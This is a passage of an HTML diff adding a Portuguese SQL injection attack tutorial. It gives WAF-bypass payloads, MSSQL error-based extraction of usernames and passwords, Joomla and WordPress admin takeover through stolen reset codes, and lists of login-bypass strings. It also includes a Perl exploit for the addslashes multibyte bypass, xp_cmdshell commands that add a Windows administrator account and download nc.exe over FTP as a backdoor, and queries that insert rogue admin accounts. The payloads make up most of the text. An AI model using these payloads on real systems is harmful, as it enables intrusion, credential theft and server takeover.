+                <pre><code>Illegal Mix of Collation</code></pre>
+                    <li><span>ou</span></li>
+                <pre><code>Union Illegal Mix of Collation</code></pre>
+                    <li><span>Então vamos ao bypass, nós podemos usar as seguintes funções:</span></li>
+                <pre><code>Cast():
+Cast(Expressão AS Tipo)
+Cast(@@version,0x3a,database() AS binary)
+Cast(@@version AS binary)
+convert():
+convert(@@version using ascii)
+HEX/ UNHEX():
+unhex(hex(@@version,0x3a,database()))
+unhex(hex(version()))
+Compress/uncompress:
+uncompress(compress(@@version))
+uncompress(compress(version()))
+encode/decode:
+decode(encode(@@version,1),1)
+decode(encode(version(),1),1)
+Encriptação AES:
+AES_DECRYPT(AES_ESCRYPT(@@version,1),1)
+AES_DECRYPT(AES_ESCRYPT(version(),1),1)</code></pre>
+                    <li><span>Mesclagem de técnicas avançadas de bypass como <strong>HPP(HTTP Parameter Polution)</strong> e <strong>HPF(HTTP Parameter Fragmentation)</strong></span></li>
+                    <li><span>Utilizando de comentários:</span></li>
+                <pre><code>/?id=1+un/<strong>/ion+sel/</strong>/ect+1,2,3--</code></pre>
+                    <li><span>O /**/ significa comentário, igual na linguagem C. Por isto quando o banco ler a query, será eliminado o comentário</span></li>
+                    <li><span>Ficando:</span></li>
+                <pre><code>union+select+1,2,3--</code></pre>
+                    <li><span>Estes últimos dois traços são para comentário também, diz que é para ser ignorado tudo que estiver depois deles.</span></li>
+                    <li><span>Utilizando HTTP Parameter Polution (HPP):</span></li>
+                        <ul>
+                            <li><span>Reconhecido e bloqueado pelo WAF:</span></li>
+                        </ul>
+                <pre><code>/?id=1;union+select+pwd+from+users--</code></pre>
+                        <ul>
+                            <li><span>Agora vamos implementar o HPP:</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Vamos considerar que estamos em ambiente ASP/IIS:</span></li>
+                        </ul>
+                <pre><code>/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users</code></pre>
+                        <ul>
+                            <li><span>Gerando o seguinte payload:]</span></li>
+                        </ul>
+                <pre><code>id=1/**/union/*,*/select/*,*/pwd/*,*/from/*,*/users (QUERY VALIDA)</code></pre>
+                    <li><span>Utilizando HTTP Parameter Fragmentation (HPF)[Caso de Concatenação, ou seja ASP,ASP.NET,AXIS,DBMAN]:</span></li>
+                        <ul>
+                            <li><span>Código Vulnerável:</span></li>
+                        </ul>
+                <pre><code>Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']);
+Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']." limit ".$_GET['c']);</code></pre>
+                        <ul>
+                            <li><span>Explicação:</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Este método consiste em comentar as outras variáveis multi valoradas e utilizar do conceito e concateção de cada ambiente.</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Exploit:</span></li>
+                        </ul>
+                <pre><code>/?a=1+union/*&amp;b=*/select+1,2
+/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--</code></pre>
+                        <ul>
+                            <li><span>Payload:</span></li>
+                        </ul>
+                <pre><code>select * from table where a=1 union/* and b=*/select 1,2
+select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users--</code></pre>
+                        <ul>
+                            <li><span>Utilizando funções Similares:</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Segue abaixo funções similares:</span></li>
+                        </ul>
+                <pre><code>substring() -&gt; mid(), substr(), etc
+ascii() -&gt; hex(), bin(), etc
+benchmark() -&gt; sleep()</code></pre>
+                        <ul>
+                            <li><span>Exemplo de como chegar ao mesmo objetivo com funções diferentes: [BLIND SQLI]</span></li>
+                        </ul>
+                <pre><code>select user from mysql.user where user = 'user' OR mid(password,1,1)='*'
+select user from mysql.user where user = 'user' OR mid(password,1,1)=0x2a
+select user from mysql.user where user = 'user' OR mid(password,1,1)=unhex('2a')
+select user from mysql.user where user = 'user' OR mid(password,1,1) regexp '[*]'
+select user from mysql.user where user = 'user' OR mid(password,1,1) like '*'
+select user from mysql.user where user = 'user' OR mid(password,1,1) rlike '[*]'
+select user from mysql.user where user = 'user' OR ord(mid(password,1,1))=42
+select user from mysql.user where user = 'user' OR ascii(mid(password,1,1))=42
+select user from mysql.user where user = 'user' OR find_in_set('2a',hex(mid(password,1,1)))=1
+select user from mysql.user where user = 'user' OR position(0x2a in password)=1
+select user from mysql.user where user = 'user' OR locate(0x2a,password)=1
+select user from mysql.user where user = 'user' OR substr(password,1,1)=0x2a
+select user from mysql.user where user = 'user' OR substring(password,1,1)=0x2a</code></pre>
+                <pre><code>substring((select 'password'),1,1) = 0x70
+substr((select 'password'),1,1) = 0x70
+mid((select 'password'),1,1) = 0x70</code></pre>
+                        <ul>
+                            <li><span>STRCMP:</span></li>
+                        </ul>
+                <pre><code>strcmp(left('password',1), 0x69) = 1 (TRUE para 1,se password password é maior que 0x71 [NUMERAÇÃO ASCII])
+strcmp(left('password',1), 0x70) = 0 (TRUE para 0, se password e 0x70 são iguais
+strcmp(left('password',1), 0x71) = -1(TRUE para -1, se password é menor que 0x71 [NUMERAÇÃO ASCII])</code></pre>
+                        <ul>
+                            <li><span>Exploit:</span></li>
+                        </ul>
+                <pre><code>false: index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)%2B112233
+false: index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x61)%2B112233
+true: index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x62)%2B112233
+Primeiro caractere da hash é = B
+
+false: index.php?uid=strcmp(left((select/<strong>/hash/</strong>/from/<strong>/users/</strong>/limit/**/0,1),2),0x6240)%2B112233
+true: index.php?uid=strcmp(left((select/<strong>/hash/</strong>/from/<strong>/users/</strong>/limit/**/0,1),2),0x6241)%2B112233
+Segundo caractere da hash é = A</code></pre>
+                    <li><span>Utilizar Operadores Booleanos Variados:</span></li>
+                <pre><code>and 1
+or 1
+and 1=1
+and 2&lt;3
+and 'a'='a'
+and 'a'&lt;&gt;'b'
+and char(32)=' '
+and 3&lt;=2
+and 5&lt;=&gt;4
+and 5&lt;=&gt;5
+and 5 is null
+or 5 is not null</code></pre>
+                    <li><span>ANALISANDO REGRAS DEFAULT DE WAF'S:</span></li>
+                        <ul>
+                            <li><span>PHPIDS (0.6.1.1) – default rules</span></li>
+                        </ul>
+                <pre><code>Forbid: /?id=1+union+select+user,password+from+mysql.user+where+user=1
+But allows: /?id=1+union+select+user,password+from+mysql.user+limit+0,1</code></pre>
+                <pre><code>Forbid: /?id=1+OR+1=1
+But allows: /?id=1+OR+0x50=0x50</code></pre>
+                <pre><code>Forbid: /?id=substring((1),1,1)
+But allows: /?id=mid((1),1,1)</code></pre>
+                        <ul>
+                            <li><span>Mod_Security (2.5.9) – default rules</span></li>
+                        </ul>
+                <pre><code>Forbid:/?id=1+and+ascii(lower(substring((select+pwd+from+users+limit+1,1),1,1)))=74
+But allows:/?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74</code></pre>
+                <pre><code>Forbid: /?id=1+OR+1=1
+But allows: /?id=1+OR+0x50=0x50</code></pre>
+                <pre><code>Forbid: /?id=1+and+5=6
+But allows: /?id=1+and+5!=6</code></pre>
+                <pre><code>Forbid: /?id=1;drop members
+But allows: /?id=1;delete members</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='MSSQL INJECTION'></a>
+            <legend>MSSQL INJECTION</legend>
+                <ul>
+                    <li><span>Um erro de mssql é parecido com o seguinte erro:</span></li>
+                <pre><code>Microsoft OLE DB Provider for SQL Server error '80040e14'
+Unclosed quotation mark after the ID integer '5' '.
+index.asp, line 30</code></pre>
+                    <li><span>Verificando a vul:</span></li>
+                <pre><code>www.target.com/index.asp?id=1 and 1=1-- Carrega normal</code></pre>
+                <pre><code>www.target.com/index.asp?id=1 and 1=2-- Mssql Erro</code></pre>
+                <pre><code>Se 1=2 carregar perfeito pode ser necessario usar (string) '+and+1=1--+-</code></pre>
+                    <li><span>Achando DATABASE, VERSION:</span></li>
+                        <ul>
+                            <li><span>Como podemos achar a versão da database?</span></li>
+                        </ul>
+                <pre><code>+and+1=convert(int,@@version)--</code></pre>
+                        <ul>
+                            <li><span>NA URL:</span></li>
+                        </ul>
+                <pre><code>www.target.com/index.asp?id=1'+and+1=convert(int,@@version)--</code></pre>
+                        <ul>
+                            <li><span>E para achar a db usamos este query:</span></li>
+                        </ul>
+                <pre><code>+and+1=convert(int,db_name())--</code></pre>
+                        <ul>
+                            <li><span>Na URL: </span></li>
+                        </ul>
+                <pre><code>www.target.com/index.asp?id=1'+and+1=convert(int,db_name())--</code></pre>
+                        <ul>
+                            <li><span>Mesmo para o user:</span></li>
+                        </ul>
+                <pre><code>'+and+1=convert(int,user_name())--</code></pre>
+                    <li><span>Extraindo os nomes das tabelas da database:</span></li>
+                        <ul>
+                            <li><span>Eu estariei usando o metodo NOT IN para achar o nome das tabelas.</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Só podemos buscar nomes de tabela, um a um. Isto é um saco ...... :p</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Então vamos buscar primeiro nome da tabela de banco de dados, nossa consulta será como:</span></li>
+                        </ul>
+                <pre><code>www.target.com/index.asp?id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables))--+-</code></pre>
+                        <ul>
+                            <li><span>Vamos dizer que o nome de nossa primeira tabela seja : <strong>table1</strong></span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Vamos agora achar o nome da segunda tabela, então nossa query ficará assim:</span></li>
+                        </ul>
+                <pre><code>+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in('table1')))--</code></pre>
+                        <ul>
+                            <li><span>Na url:</span></li>
+                        </ul>
+                <pre><code>www.target.com/index.asp?id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in('table1')))--</code></pre>
+                        <ul>
+                            <li><span>E para a terceira tabela usamos:</span></li>
+                        </ul>
+                <pre><code>www.target.com/index.asp?id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in('table1','table2')))--</code></pre>
+                    <li><span>Achando o nome das colunas:</span></li>
+                        <ul>
+                            <li><span>OK, então agora nós temos os nomes das tabela, mas nós não sabemos como encontrar os nomes das colunas nessas tabelas?</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Vamos dizer que queremos encontrar colunas da table1.</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Iremos usar esta query:</span></li>
+                        </ul>
+                <pre><code>+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='table1'))--</code></pre>
+                        <ul>
+                            <li><span>Na url:</span></li>
+                        </ul>
+                <pre><code>www.target.com/index.asp?id=1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='table1'))--</code></pre>
+                        <ul>
+                            <li><span><strong>Nota: table1 é o nome da tabela</strong></span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Agora vamos ver a mensagem com o erro:</span></li>
+                        </ul>
+                <pre><code>Microsoft OLE DB Provider for SQL Server error '80040e07'
+Conversion failed when converting the nvarchar value 'username' to data type int.
+index.asp, line 30</code></pre>
+                        <ul>
+                            <li><span>Então, se olharmos com atenção, veremos o nome da coluna neste erro que é <strong>username</strong></span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Agora .. temos o nosso primeiro nome da coluna, como encontrar a próxima coluna?</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Usaremos esta query:</span></li>
+                        </ul>
+                <pre><code>+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='table1'+and+column_name+not+in+('username')))--</code></pre>
+                        <ul>
+                            <li><span>Na URL:</span></li>
+                        </ul>
+                <pre><code>www.target.com/index.asp?id=1'+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='table1'+and+column_name+not+in+('username')))--</code></pre>
+                        <ul>
+                            <li><span>Tudo bem, digamos que esse erro mostre que a column_name é <strong>Password</strong></span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Então é assim que as coisas funcionam no método <strong>NOT IN</strong></span></li>
+                        </ul>
+                    <li><span>Fazendo dump das info:</span></li>
+                        <ul>
+                            <li><span>Ok, agora nós temos tabelas e seus nomes de coluna, mas não sabemos como extrair as entradas a partir destas tabelas e colunas.</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Vamos dizer que temos nome da coluna nome de usuário na tabela table1. </span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Para obter suas entradas usaremos uma query como:</span></li>
+                        </ul>
+                <pre><code>+and+1=convert(int,(select+top+1+username+from+table1))--</code></pre>
+                        <ul>
+                            <li><span>O erro será :</span></li>
+                        </ul>
+                <pre><code>Microsoft OLE DB Provider for SQL Server error '80040e07'
+Conversion failed when converting the nvarchar value 'admin@site' to data type int.
+index.asp, line 30</code></pre>
+                        <ul>
+                            <li><span>admin@site é o username</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>e para o password usamos:</span></li>
+                        </ul>
+                <pre><code>+and+1=convert(int,(select+top+1+password+from+table1))--</code></pre>
+                        <ul>
+                            <li><span>Na URL:</span></li>
+                        </ul>
+                <pre><code>www.target.com/index.asp?id=1'+and+1=convert(int,(select+top+1+username+from+table1))--</code></pre>
+                        <ul>
+                            <li><span>O erro sera:</span></li>
+                        </ul>
+                <pre><code>Microsoft OLE DB Provider for SQL Server error '80040e07'
+Conversion failed when converting the nvarchar value 'adminPass123' to data type int.
+index.asp, line 30</code></pre>
+                    <li><span>Ler arquivos do server:</span></li>
+                <pre><code>select load_file(nome_do_arquivo_em_hex_0x61)</code></pre>
+                    <li><span>Criar arquivo no server:</span></li>
+                <pre><code>select '&lt;?php phpinfo(); ?&gt;' INTO OUTFILE '/home/site/public_html/out.php'</code></pre>
+                    <li><span>Alterar valor de uma coluna:</span></li>
+                <pre><code>set tabela update coluna='novo_valor'</code></pre>
+                    <li><span>E.g: set usuarios update senha='nova_senha'</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Sql Injection em Joomla e Wordpress'></a>
+            <legend>Sql Injection em Joomla e Wordpress</legend>
+                <ul>
+                    <li><span>Bom a unica diferença para os sites normais é que a maioria das senhas de wp e joomla tem hashes fodas e que levam um grande tempo para serem quebrados então o modo mais facil para se conseguir acesso é através do codigo de ativação ,vc irá utilizar ele para modificar a senha de um admin da seguinte maneira:</span></li>
+                    <li><span>Joomla :</span></li>
+                    <li><span>Vc vai baixar as colunas que conterem os email os users e os codigos de ativação depois basta fazer o seguinte :</span></li>
+                <pre><code>http://site.com/index.php?option=com_user&amp;view=reset</code></pre>
+                    <li><span>Vai pedir o email basta colocar o email que pegou da db.</span></li>
+                    <li><span>Depois basta colocar o codigo de ativação :</span></li>
+                <pre><code>http://site.com/index.php?option=com_user&amp;view=reset&amp;layout=confirm</code></pre>
+                    <li><span>Após,só logar na pagina de adm /administrator</span></li>
+                    <li><span>Wordpress :</span></li>
+                    <li><span>Mesma situação, baixe os users , emails e codigos de ativação depois vai em:</span></li>
+                <pre><code>http://site.com/wp-login.php?action=lostpassword</code></pre>
+                    <li><span>Coloque o user e depois basta ir na url:</span></li>
+                <pre><code>http://site.com/wp-login.php?action=rp&amp;key=<strong>Coloque seu codigo de ativação aqui</strong>&amp;login=<strong>Coloque o referente user aqui</strong></code></pre>
+                    <li><span>Depois só logar no /wp-login.php bem simples.</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Sql Injection em Logins'></a>
+            <legend>Sql Injection em Logins</legend>
+                <ul>
+                    <li><span>Bom este é o método mais simples do sql injection , consiste em injetar strings nos campos de user e pass dos logins se o site estiver mal programado será recebida uma validação mesmo sem possuir o user ou a senha na tabela.</span></li>
+                    <li><span>Para explorar esta falha basta usar algumas strings nos campos de user e pass da seguinte maneira:</span></li>
+                <pre><code>                  ----------------------------------------
+Username         |               ' or 1='1                |
+                 |                                        |
+                  ----------------------------------------
+
+                  ----------------------------------------
+Password         |               xxxxxxxxx                |
+                 |                                        |
+                  ----------------------------------------</code></pre>
+                    <li><span>Depois basta clicar em login e pronto se o site estiver vul será efetuado o login.</span></li>
+                    <li><span>As strings mais comuns a serem injetadas são:</span></li>
+                <pre><code>' or 1='1   &lt;--- mais usada
+hi ‘ ou 1=1 –
+hi ‘ ou ‘ a’='a
+hi ‘) ou (‘ a’='a
+hi”) ou (“a”=”a
+admin ‘ – -
+‘ ou 0=0 –
+“ou 0=0 –
+ou 0=0 –
+‘ or ‘ 1
+b’ or ‘ 1=’
+‘ or ’1
+‘ or ‘|
+‘ or ‘a’='a
+‘ or ”=’
+‘ or 1=1–
+‘) or (‘a’='a
+‘ or ’1′=’1
+‘ ou 0=0 #
+“ou 0=0 #
+ou 0=0 #
+‘ ou ‘ x’='x
+“ou” x”=”x
+‘) ou (‘ x’='x
+“ou” a”=”a
+‘) ou (‘ a’='a
+“) ou (“a”=”a
+hi “ou” a”=”a
+hi “ou 1=1 –
+‘ ou 1=1 –
+“ou 1=1 –
+ou 1=1 –
+‘ ou a=a –
+‘ ou 1=1 –
+“ou 1=1 –
+ou 1=1 –
+‘ ou a=a –</code></pre>
+                    <li><span>Agora para previnir esta vul muitos admins recorreram a função <strong>addslashes()</strong> ou a <strong>magic_quotes_gpc</strong> mas ainda rola burlar estas funções que consistem basicamente em add uma <strong>\</strong> antes das aspas nos métodos <strong>GET</strong> , <strong>POST</strong> e <strong>COOKIE</strong> a cada requisição. </span></li>
+                    <li><span>Porém ainda existe uma falha constante feita no codificação aonde os caracteres <strong>\xbf\x27</strong> são interpretados como single-byte assim liberando o single-quotes.</span></li>
+                    <li><span>Outra forma seria injetar um comando que force a db durmir por 15 sec.</span></li>
+                    <li><span>Um exploit feito em perl que faz o bypass desta vul pelo método do single-byte seria:</span></li>
+                <pre><code>#!/usr/bin/env perl
+ 
+use common::sense;
+use WWW::Curl::Easy;
+ 
+sub cURL {
+my ( $url, $header, $post ) = @_;
+my $curl = WWW::Curl::Easy-&gt;new;
+$curl-&gt;setopt( CURLOPT_HEADER,         $header // 0 );
+$curl-&gt;setopt( CURLOPT_NOBODY,         $header // 0 );
+$curl-&gt;setopt( CURLOPT_URL,            $url );
+if(defined $post) {
+$curl-&gt;setopt( CURLOPT_CUSTOMREQUEST, $post ? 'POST' : 'GET' );
+$curl-&gt;setopt( CURLOPT_POST,          1 );
+$curl-&gt;setopt( CURLOPT_POSTFIELDS,    $post );
+}
+my $r;
+$curl-&gt;setopt( CURLOPT_WRITEDATA, $r );
+return ( $curl-&gt;perform == 0 ) ? $r : 0;
+}
+ 
+my $xpl = '\' or \'1\'=\'1';
+$xpl =~ s/x27/chr(0xbf).chr(0x27)/ge;
+say cURL('http://site.com/admin', 1, 'user=site&amp;passwd=' . $xpl);</code></pre>
+                    <li><span>Ou se preferier metodo manual seria:</span></li>
+                <pre><code>http://site.com/admin.asp?user=site$passwd=%bf%27'or%20'1='1</code></pre>
+                    <li><span>Agora o método de mandar a database dumir por 15 sec seria o seguinte:</span></li>
+                <pre><code>http://site.com/admin.asp?max=0+and+sleep(15)</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Sql Injection em Windows'></a>
+            <legend>Sql Injection em Windows</legend>
+                <ul>
+                    <li><span>Se vc achar uma vul sql injection em um windows aonde o site utilize uma conta <strong>sa</strong> é possivel add um administrador e logar por remote desktop ou ainda upar uma backdoor no server.</span></li>
+                    <li><span>Ok então vamos lá :</span></li>
+                <pre><code>Site vul: www.site.com/vul.asp?id=1'</code></pre>
+                <pre><code>Mcft OLE DB Provider for ODBC Drivers error '80040e14' 
+[Mcft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the character string ''.</code></pre>
+                    <li><span>Agora vc precisa verificar se o site está com o user "sa" da seguinte maneira:</span></li>
+                <pre><code>Url:http://site.com/vul.asp?id=system_user--</code></pre>
+                <pre><code>[Mcft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'sa' to a column of data type int.</code></pre>
+                    <li><span>Ok então está com um conta *sa* então rola continuar , agora devemos criar uma tabela com os compas e armazenar o ip do server na tabela sin da seguinte manieira:</span></li>
+                <pre><code>Url:http://site.com/vul.asp?id=1;drop table sin create table sin (id int identity,nd varchar(1000)) insert into sin exec master..xp_cmdshell 'ip config'--sp_password</code></pre>
+                    <li><span>Agora pegaremos o ip com o seguinte comando:</span></li>
+                <pre><code>Url:http://site.com/vul.asp?id=convert(int,(select top 1 nd from sin where id=1)) --sp_password</code></pre>
+                <pre><code>Mcft OLE DB Provider for SQL Server error '80040e07' 
+Syntax error converting the varchar value ' ' to a column of data type int.</code></pre>
+                    <li><span>Ok, como podemos ver aqui com o <strong>id=1</strong> não rolou aparecer o ip então vc deverá mudar pra <strong>id=2</strong> ou <strong>id=3</strong> e ir continuando até conseguir achar , quando achar aparecerá o seguinte:</span></li>
+                <pre><code>Mcft OLE DB Provider for SQL Server error '80040e07' 
+Syntax error converting the varchar value ' IP Address. . . . . . . . . . . . : xxx.xxx.xxx.xxx ' to a column of data type int.* 
+    Feito isto utilizamos um port scan para verificar quais portas estão abertas:
+    *root@CyberHats:~# nmap xxx.xxx.xxx.xxx
+
+Discovered open port 21/tcp on xxx.xxx.xxx.xxx 
+Discovered open port 443/tcp on xxx.xxx.xxx.xxx 
+Discovered open port 80/tcp on xxx.xxx.xxx.xxx 
+Discovered open port 3389/tcp on xxx.xxx.xxx.xxx</code></pre>
+                    <li><span>Ok, então vamos lá agora dá pra upar uma backdoor pelo telnet ou entao criar uma conta admin para vc se conectar por remote desktop assim:</span></li>
+                <pre><code>Url:http://site.com/vul.asp?id=1;exec master..xp_cmdshell 'net user sin 123456 /add'--sp_password;exec master..xp_cmdshell 'net localgroup administrators sin /add'--sp_password</code></pre>
+                    <li><span>Este comando criou no grupo de administradores uma conta com username 'sin' e password '123456' agora basta vc logar por remote desktop colocar o ip do server user 'sin' e pass '123456' pronto vai estar logado ;)</span></li>
+                    <li><span>Pra upar a backdoor pelo ftp vc pode utilizar o seguinte comando :</span></li>
+                <pre><code>http://site.com/vul.asp?id=exec master..xp_cmdshell 'echo open ftp.site.com &gt; c:\ftp' --sp_password;exec master..xp_cmdshell 'echo user username &gt;&gt; c:\ftp'--sp_password;exec master..xp_cmdshell 'echo password &gt;&gt; c:\ftp'--sp_password;exec master..xp_cmdshell 'echo get nc.exe &gt;&gt; c:\ftp'--sp_password;exec master..xp_cmdshell 'echo quit &gt;&gt; c:\ftp'--sp_password;exec master..xp_cmdshell 'ftp -i -n -v -s:c:\ftp'--sp_password;exec master..xp_cmdshell 'del c:\ftp'--sp_password</code></pre>
+                    <li><span>E pronto backdoor upada é bem simples qualquer um que entenda o basico de rce e de sql injection consegue entender os comandos e fazer seus proprios métodos apartir desta explicação, existe varias coisas que dá pra fazer só usar a criatividade :)</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Sql Injection em User-Agent'></a>
+            <legend>Sql Injection em User-Agent</legend>
+                <ul>
+                    <li><span>O sql injection no user agent é um técnica pouco utilizada mas é muito util e possui em bastantes sites tops vc pode usar o tamper date ou algum aplicativo em browsers para mandar as requests ele funciona da mesma maneira que o sql injection manual a unico diferença é que a injeção será no user-agent com o tamper date é mais facil e mais rapido mas para demonstrar aqui preferir usar o telnet.</span></li>
+                    <li><span>A unica coisa que vc vai fazer é alterar o user-agent, tipo imagine o seguinte user agent <strong>Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201</strong> tudo que vc irá fazer é subistituir este user-agent pelos comandos do sql manual da seguinte maneira:</span></li>
+                <pre><code>root@CyberHats:~# telnet xxx.xxxxxxxxxx.xxx.xx 80
+Trying xxx.xxx.xxx.xxx...
+Connected to xxx.xxx.xxx.xxx.
+Escape character is '^]'.
+GET /index.php HTTP/1.1
+Host: xxx.xxxxxxxxxx.xxx.xx
+User-Agent: ' union select 1-- --</code></pre>
+                    <li><span>Após isto se o website estiver vul vai mostrar o erro, se vc fizer pelo tamper date o erro aparece no proprio browser e vai ser facil de identificar agora se for pelo telnet fica mais foda identificar pq vai mostrar o source-code da page por isto recomendo pelo tamper date que é bem mais rapido e eficiente pelo tamper é a mesma coisa só trocar o user-agent pelos comandos do sql injection manual e já era ;)</span></li>
+                    <li><span>Ou então utilizar o burpsuite.</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Sql Injection em Cookies'></a>
+            <legend>Sql Injection em Cookies</legend>
+                <ul>
+                    <li><span>O sql injection nos cookies é bem parecido com o do user-agent só que no lugar de vc injetar no user-agent vc vai injetar no cookie assim como o metodo do user-agent é bem pouco utilizado e tem bastantes sites vuls este tb, então vamos lá o que vc irá fazer é utilizar o tamper date pra pegar os cookies da page ou algum outro metodo para ver os cookies então assim como no user-agent tu manda um request é bem simples:</span></li>
+                    <li><span>Imagina que vc pegou o cookie da sua pagina e ele é tipo assim:</span></li>
+                <pre><code>user_session=ckjs34fsdkj455ygdman3:language_id=1</code></pre>
+                    <li><span>Para vc verificar se o site está vul a cookie sql injection basta colocar <strong>'</strong> no final e verificar se dá erro igual o user-agent, assim:</span></li>
+                <pre><code>root@CyberHats:~# telnet xxx.xxxxxxxxxx.xxx.xx 80
+Trying xxx.xxx.xxx.xxx...
+Connected to xxx.xxx.xxx.xxx.
+Escape character is '^]'.
+GET / HTTP/1.1
+Connection: Keep-Alive
+Keep-Alive: 300
+Accept: /
+Host: xxx.xxx.xxx.xxx
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US;
+rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 ( .NET CLR 3.5.30729; .NET4.0E)
+Cookie: user_session=ckjs34fsdkj455ygdman3:language_id=1 ' union select 1-- -- &lt;-- aqui tu manda os comandos ;)</code></pre>
+                    <li><span>Simples assim.</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Sql injection no X-Forwarded-For'></a>
+            <legend>Sql injection no X-Forwarded-For</legend>
+                <ul>
+                    <li><span>O X-Forwarded-For é um header field  que identifica endereços ip a injeção neste header field é praticamente igual a dos cookies e a do user-agent se a variavel <strong>HTTP_X_FORWARDED_FOR</strong> estiver mal programada é possivel inserir comandos SQL.</span></li>
+                <pre><code>root@CyberHats:~# telnet xxx.xxxxxxxxxx.xxx.xx 80
+Trying xxx.xxx.xxx.xxx...
+Connected to xxx.xxx.xxx.xxx.
+Escape character is '^]'.
+GET /admin/index.php HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+X_FORWARDED_FOR :127.0.0.1' or 1=1#</code></pre>
+                    <li><span>O exemplo acima verificaria se o server está vul caso vc receba algum erro do banco de dados o site é vul então bastaria mandar as injeções no x forwarded for por exemplo:</span></li>
+                <pre><code>root@CyberHats:~# telnet xxx.xxxxxxxxxx.xxx.xx 80
+Trying xxx.xxx.xxx.xxx...
+Connected to xxx.xxx.xxx.xxx.
+Escape character is '^]'.
+GET /admin/index.php HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+X_FORWARDED_FOR :127.0.0.1'+and+0+order+by+1--+#</code></pre>
+                    <li><span>E pronto vc está injetando pelo header field X-Forwarded-For.;)</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Manipulando Database por SQL Injection (MYSQL)'></a>
+            <legend>Manipulando Database por SQL Injection (MYSQL)</legend>
+                <ul>
+                    <li><span>Bom, além dos métodos apresentados sobre SQL Injection como segunda opção caso você não consiga logar por diversos motivos inclusive o principal é a encriptação da password da senha do administrador não ser quebrada... </span></li>
+                    <li><span>Vamos apresentar mais um método pra noix:</span></li>
+                    <li><span>Podemos adicionar mais um login ou até mesmo alterar a password do administrador...</span></li>
+                    <li><span>COMANDO INSERT(Adicionando uma conta inexistente):</span></li>
+                    <li><span>1- Devemos exploitar o sqli normalmente e identificar as colunas e a tabela do administrador...</span></li>
+                    <li><span>2- Supomos que o nome da tabela admin é: <strong>admin_login</strong></span></li>
+                    <li><span>3- E tambem que as colunas da tabela <strong>admin_login</strong> são:</span></li>
+                <pre><code>Table:admin_login
+Columns:
++-----------+
+| id        |
+| login     |
+| senha     |
++-----------+</code></pre>
+                    <li><span>4- Sabendo destes dados podemos utilizar a seguinte query para adicionar um novo login:</span></li>
+                <pre><code>http://site.com/index.php?id=1; INSERT INTO admin_login (id,login,senha) values ('10','admin2','21232f297a57a5a743894a0e4a801fc3')--  ~~&gt; com a senha encriptada em MD5</code></pre>
+                    <li><span>CASO NÃO FUNCIONE O PRIMEIRO INSERT...:</span></li>
+                <pre><code>http://site.com/index.php?id=1; INSERT INTO admin_login (id,login,senha) values ('10','admin2','admin')-- ~~&gt; com a senha em texto comum</code></pre>
+                    <li><span>Após isto é só logar normalmente com seu login, caso não aceite podem existir outras páginas de adminstração...</span></li>
+                    <li><span>COMANDO UPDATE(Editando uma conta existente):</span></li>
+                    <li><span>Mas as vezes a conta criada não é o admin e não possue privilégios para o objetivo que você deseja (webshell,redirect...).</span></li>
+                    <li><span>Para isto podemos então certificar de que iremos acessar uma conta que possue privilégio máximo, Sim ! vamos editar os dados no banco de dados do administrador:</span></li>
+                    <li><span>Vamos precisar de:</span></li>
+                <pre><code> ID do administrador</code></pre>
+                <pre><code> Tabela dos logins (Ex:admin_login)</code></pre>
+                <pre><code> colunas da tabela dos logins (Ex:</code></pre>
+                <pre><code>+-----------+---------------------------------+
+| id        | 1                               |
+| login     | admin                           |
+| senha     | 21232f297a57a5a743894a0e4a801fc3|
++-----------+---------------------------------+</code></pre>
